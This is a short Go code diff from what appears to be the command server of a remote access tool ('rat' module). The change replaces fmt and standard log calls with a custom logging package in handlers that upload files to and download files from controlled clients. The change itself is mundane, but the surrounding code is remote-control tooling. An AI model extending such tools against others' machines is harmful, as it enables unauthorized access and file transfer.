@@ -1,10 +1,9 @@
 package main
 
 import (
-	"fmt"
 	"html/template"
-	"log"
 	"net/http"
+	"rat/command/log"
 	"rat/shared"
 	"strconv"
 )
@@ -53,18 +52,18 @@ func init() {
 		file, header, err := r.FormFile("file")
 
 		if err != nil {
-			fmt.Println(err.Error())
+			log.Println(err.Error())
 		}
 
 		id, _ := strconv.Atoi(r.PostFormValue("id"))
 		client := GetClient(id)
 
 		remote := dir + header.Filename
-		fmt.Println("Remote file:", remote)
+		log.Println("Remote file:", remote)
 
 		err = StartTransfer(client, file, remote)
 		if err != nil {
-			fmt.Println("upload:", err.Error())
+			log.Println("upload:", err.Error())
 		}
 	})
 	http.HandleFunc("/download", func(w http.ResponseWriter, r *http.Request) {
@@ -80,5 +79,5 @@ func init() {
 }
 
 func startWebserver() {
-	log.Fatal(http.ListenAndServeTLS(GlobalConfig.HTTPAddress, "cert.pem", "private.key", nil))
+	log.Println(http.ListenAndServeTLS(GlobalConfig.HTTPAddress, "cert.pem", "private.key", nil))
 }
